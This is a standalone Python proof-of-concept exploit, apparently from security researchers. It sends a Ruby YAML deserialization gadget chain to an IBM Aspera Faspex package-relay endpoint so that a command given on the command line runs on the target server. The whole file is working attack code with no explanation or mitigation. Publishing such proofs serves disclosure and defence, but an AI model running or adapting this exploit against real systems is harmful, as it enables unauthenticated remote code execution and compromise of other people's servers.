import requests, sys

url = "{}/aspera/faspex/package_relay/relay_package".format(sys.argv[1])

uuid = "d7cb6601-6db9-43aa-8e6b-dfb4768647ec"

exploit_yaml = """
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/module "Kernel"
                 method_id: :eval
             newline: "throw `CMD`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
""".replace("CMD",sys.argv[2])

payload = {
	"package_file_list": [
		"/"
	],
	"external_emails": exploit_yaml,
	"package_name": "assetnote_pack",
	"package_note": "hello from assetnote team",
	"original_sender_name": "assetnote",
	"package_uuid": uuid,
	"metadata_human_readable": "Yes",
	"forward": "pew",
	"metadata_json": '{}',
	"delivery_uuid": uuid,
	"delivery_sender_name": "assetnote",
	"delivery_title": "TEST",
	"delivery_note": "TEST",
	"delete_after_download": True,
	"delete_after_download_condition": "IDK",

}

r = requests.post(url,json=payload,verify=False)
print(r.text)
